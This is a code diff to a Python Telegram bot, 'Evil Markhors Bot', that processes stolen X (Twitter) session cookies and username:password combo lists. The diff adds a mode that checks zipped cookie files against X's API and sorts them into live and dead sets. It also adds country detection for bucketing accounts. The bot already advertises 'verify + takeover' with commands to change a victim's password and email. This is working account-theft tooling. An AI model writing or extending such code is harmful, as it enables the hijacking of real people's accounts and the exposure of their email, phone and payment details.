@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Evil Markhors Bot - HARDENED (clean + admin split)
-Live progress + crash-proof + auto-recovery + admin bucket split.
+Evil Markhors Bot - HARDENED (clean + admin split + verify)
+Live progress + crash-proof + auto-recovery + bucket split + cookie verify.
 """
 import os
 import io
@@ -49,6 +49,7 @@ SELF = os.path.basename(os.path.abspath(__file__))
 
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "7028523300,6120166351").split(",") if x.strip()}
 SPLIT = {}
+CTEST = set()
 KEYMAP = {
     "year": "Year", "followers": "Followers", "friends": "Friends", "posts": "Posts",
     "likes": "Likes", "media": "Media", "verified": "Verified", "card": "Card added",
@@ -69,7 +70,7 @@ UA = (
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 
 FIELDS = [
-    "Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media", "Verified",
+    "Status", "Username", "ID", "Followers", "Friends", "Posts", "Likes", "Media", "Verified",
     "Verified type", "Suspended", "Protected", "Country", "Year", "Created", "Email",
     "Phone", "2FA", "Card added", "API", "Developer API",
 ]
@@ -340,6 +341,38 @@ def _yr(s):
     return m.group(0) if m else ""
 
 
+def norm_country(v):
+    v = (v or "").strip()
+    if len(v) == 2 and v.isalpha():
+        return v.upper()
+    return v
+
+
+async def detect_country(client, ck):
+    s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
+    if isinstance(s, dict):
+        cc = norm_country(s.get("country_code") or "")
+        if len(cc) == 2:
+            return cc
+        tl = s.get("trend_location")
+        if isinstance(tl, list) and tl:
+            cc = norm_country(tl[0].get("countryCode") or "")
+            if len(cc) == 2:
+                return cc
+            nm = (tl[0].get("country") or "").strip()
+            if nm:
+                return nm
+    j = await get_json(
+        client, ck,
+        "https://api.x.com/1.1/account/verify_credentials.json?include_entities=false&skip_status=true",
+    )
+    if isinstance(j, dict):
+        loc = (j.get("location") or "").strip()
+        if loc:
+            return loc
+    return ""
+
+
 async def live_check(client, ck):
     d = {}
     j = await get_json(
@@ -348,6 +381,7 @@ async def live_check(client, ck):
         "?include_entities=false&skip_status=true&include_email=true",
     )
     if j:
+        d["Status"] = "LIVE"
         d.update({
             "Username": j.get("screen_name", ""),
             "ID": j.get("id_str", ""),
@@ -366,18 +400,11 @@ async def live_check(client, ck):
             d["Created"] = j["created_at"]
             if _yr(j["created_at"]):
                 d["Year"] = _yr(j["created_at"])
-    s = await get_json(client, ck, "https://api.x.com/1.1/account/settings.json")
-    if s and s.get("country_code"):
-        d["Country"] = s["country_code"]
-    pm = await get_json(client, ck, "https://api.x.com/1.1/account/payment_methods.json")
-    if isinstance(pm, dict) and "cards" in pm:
-        d["Card added"] = "Yes" if pm.get("cards") else "No"
-    fs = await get_json(client, ck, "https://api.x.com/1.1/account/feature_switches.json")
-    if isinstance(fs, dict):
-        if "has_api_access" in fs:
-            d["API"] = str(bool(fs["has_api_access"])).lower()
-        if "developer_api" in fs:
-            d["Developer API"] = str(bool(fs["developer_api"])).lower()
+        cc = await detect_country(client, ck)
+        if cc:
+            d["Country"] = cc
+    else:
+        d["Status"] = "DEAD"
     return d
 
 
@@ -388,10 +415,12 @@ async def rework_cookie(text, client, live, sem):
             try:
                 ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
             except asyncio.TimeoutError:
-                ld = {}
+                ld = {"Status": "DEAD"}
         for k, v in ld.items():
             if v not in ("", None):
                 data[k] = str(v)
+    elif cookies:
+        data.setdefault("Status", "UNKNOWN")
     data["Cookies"] = CREDIT
     return build_cookie_file(data, cookies)
 
@@ -678,7 +707,7 @@ def fmt_result(r):
     return "\n".join(o)
 
 
-# ============================ ADMIN SPLIT HELPERS ============================
+# ============================ ADMIN HELPERS ============================
 def is_admin(uid):
     try:
         return int(uid) in ADMIN_IDS
@@ -762,6 +791,52 @@ async def process_cookie_zip(ip, op, live, prog):
     return prog.ok, prog.fail, prog.total
 
 
+async def process_verify(ip, op, live, prog):
+    sem = asyncio.Semaphore(CONCURRENCY)
+    working = []
+    dead = []
+    async with httpx.AsyncClient(follow_redirects=True) as client:
+        with zipfile.ZipFile(ip) as zin:
+            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
+            names = names[:MAX_FILES]
+            prog.total = len(names)
+            for name in names:
+                try:
+                    text = zin.read(name).decode("utf-8", "ignore")
+                    data, cookies = parse_cookie_file(text)
+                    ok = False
+                    if cookies:
+                        async with sem:
+                            try:
+                                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
+                            except asyncio.TimeoutError:
+                                ld = {"Status": "DEAD"}
+                        for k, v in ld.items():
+                            if v not in ("", None):
+                                data[k] = str(v)
+                        ok = data.get("Status") == "LIVE"
+                    else:
+                        data["Status"] = "DEAD"
+                    if ok:
+                        working.append((name, build_cookie_file(data, cookies)))
+                        prog.ok += 1
+                    else:
+                        data["Status"] = "DEAD"
+                        dead.append((name, build_cookie_file(data, cookies)))
+                        prog.fail += 1
+                except Exception:
+                    logging.exception("verify %s", name)
+                    prog.fail += 1
+                prog.done += 1
+                await prog.update()
+    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
+        for name, out in working:
+            z.writestr("working/" + os.path.basename(name), out)
+        for name, out in dead:
+            z.writestr("dead/" + os.path.basename(name), out)
+        z.writestr("summary.txt", "working: " + str(len(working)) + "\ndead: " + str(len(dead)))
+
+
 async def process_split(ip, op, cfg, live, prog):
     field = cfg["field"]
     buckets = cfg["buckets"]
@@ -793,6 +868,8 @@ async def process_split(ip, op, cfg, live, prog):
                         val = field_value(data, field)
                     if field in BOOL_FIELDS:
                         val = norm_bool(val)
+                    elif field == "country":
+                        val = norm_country(val)
                     label = bucket_for(val, buckets, is_num)
                     if label:
                         out[label].extend(cookies)
@@ -904,10 +981,11 @@ async def _send_zip(u, path, filename, caption):
 async def start(u, c):
     await u.message.reply_text(
         "Evil Markhors Bot\n\nModes:\n"
-        "1) COOKIES: cookie file -> rework\n2) ULP: user:pass -> verify + takeover\n\n"
-        "/mode auto|cookies|ulp\n/live on|off\n/takeover on|off\n/newpass <p>\n"
+        "1) COOKIES: cookie file -> rework\n2) ULP: user:pass -> verify + takeover\n"
+        "3) VERIFY: cookie file -> LIVE/DEAD check\n\n"
+        "/mode auto|cookies|ulp|verify\n/live on|off\n/takeover on|off\n/newpass <p>\n"
         "/newemail you@gmail.com\n/status\n/diag\n/finalize\n/cancel\n\n"
-        "Admin: /split /splitoff /broadcast\n\n"
+        "Admin: /split /splitoff /broadcast /countrytest\n\n"
         "Code maange to bot batayega, aap code bhej dena."
     )
 
@@ -916,6 +994,7 @@ async def help_cmd(u, c):
     await u.message.reply_text(
         "ULP: user:pass | email:pass | user:email:pass | ...:2fa\n"
         "Code aane par: username code (har line alag).\n\n"
+        "VERIFY: /mode verify -> zip bhejo -> working/ aur dead/ folders\n\n"
         "Admin split: /split followers 0-100,100-500,500+\n"
         "Fields: " + ", ".join(KEYMAP)
     )
@@ -952,10 +1031,15 @@ async def diag_cmd(u, c):
 
 async def mode_cmd(u, c):
     a = c.args[0].lower() if c.args else "auto"
-    if a not in ("auto", "cookies", "ulp"):
+    if a not in ("auto", "cookies", "ulp", "verify"):
         a = "auto"
     await set_cfg(u.effective_user.id, mode=a)
     await u.message.reply_text("Mode = " + a)
+
+
+async def verify_cmd(u, c):
+    await set_cfg(u.effective_user.id, mode="verify")
+    await u.message.reply_text("Mode = verify\nAb cookie zip bhejo — working/ aur dead/ folders milenge.")
 
 
 async def live_cmd(u, c):
@@ -1005,7 +1089,7 @@ async def split_cmd(u, c):
             await u.message.reply_text(
                 "Split set nahi hai.\nFields: " + ", ".join(KEYMAP) + "\n"
                 "Misaal: /split followers 0-100,100-500,500-1000,1000+\n"
-                "Misaal: /split year 2008-2012,2013-2016,2017+"
+                "Misaal: /split country PK,IN,US,GB"
             )
         else:
             await u.message.reply_text(
@@ -1058,8 +1142,38 @@ async def broadcast_cmd(u, c):
     await u.message.reply_text("Broadcast: " + str(sent) + " sent, " + str(fail) + " fail")
 
 
+async def countrytest_cmd(u, c):
+    if not is_admin(u.effective_user.id):
+        await u.message.reply_text("Sirf admin.")
+        return
+    CTEST.add(str(u.effective_user.id))
+    await u.message.reply_text("Ek account ka cookie .txt bhejo - country detect karke bataunga.")
+
+
+async def country_test(u, doc):
+    tmp = tempfile.mkdtemp(prefix="ct_")
+    p = os.path.join(tmp, "c.txt")
+    try:
+        f = await doc.get_file()
+        await f.download_to_drive(p)
+        with open(p, encoding="utf-8", errors="ignore") as fh:
+            data, cookies = parse_cookie_file(fh.read())
+        if not cookies:
+            await u.message.reply_text("Cookie lines nahi mili.")
+            return
+        async with httpx.AsyncClient(follow_redirects=True) as client:
+            cc = await detect_country(client, cookie_dict(cookies))
+        await u.message.reply_text(
+            "Country: " + (cc or "(nahi mila)") + "\nusername: " + str(data.get("Username", ""))
+        )
+    except Exception as e:
+        await u.message.reply_text("Error: " + str(e))
+    finally:
+        shutil.rmtree(tmp, ignore_errors=True)
+
+
 def detect_mode(text, forced):
-    if forced in ("cookies", "ulp"):
+    if forced in ("cookies", "ulp", "verify"):
         return forced
     n = 0
     for l in text.splitlines():
@@ -1129,9 +1243,21 @@ async def handle_file(u, c, doc):
         mode = detect_mode(sample, g["mode"])
         BATCH[uid]["mode"] = mode
 
-        if mode == "cookies":
+        if mode in ("cookies", "verify"):
             op = os.path.join(tmp, "out.zip")
             cfg = SPLIT.get(uid)
+            if mode == "verify" and is_zip:
+                prog = Progress(msg, 0, "VERIFY")
+                prog.phase = "Checking"
+                await process_verify(ip, op, True, prog)
+                await _send_zip(
+                    u, op, "evilmarkhors_verify.zip",
+                    "Verify done | live " + str(prog.ok) + " | dead " + str(prog.fail)
+                    + "\n" + WEBSITE + "\n" + CREDIT,
+                )
+                await _edit(msg, "Complete")
+                await _hard_clear(uid)
+                return
             if cfg and is_zip:
                 prog = Progress(msg, 0, "SPLIT")
                 prog.phase = "Bucket: " + cfg["field"]
@@ -1327,6 +1453,11 @@ async def on_doc(u, c):
     doc = u.message.document
     if not doc:
         return
+    uid = str(u.effective_user.id)
+    if uid in CTEST and (doc.file_name or "").lower().endswith(".txt"):
+        CTEST.discard(uid)
+        await country_test(u, doc)
+        return
     await handle_file(u, c, doc)
 
 
@@ -1340,10 +1471,11 @@ def main():
     app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
     handlers = [
         ("start", start), ("help", help_cmd), ("status", status_cmd), ("diag", diag_cmd),
-        ("mode", mode_cmd), ("live", live_cmd), ("takeover", takeover_cmd),
+        ("mode", mode_cmd), ("verify", verify_cmd), ("live", live_cmd), ("takeover", takeover_cmd),
         ("newpass", newpass_cmd), ("newemail", newemail_cmd),
         ("finalize", finalize_cmd), ("cancel", cancel_cmd),
         ("split", split_cmd), ("splitoff", splitoff_cmd), ("broadcast", broadcast_cmd),
+        ("countrytest", countrytest_cmd),
     ]
     for cmd, fn in handlers:
         app.add_handler(CommandHandler(cmd, fn))
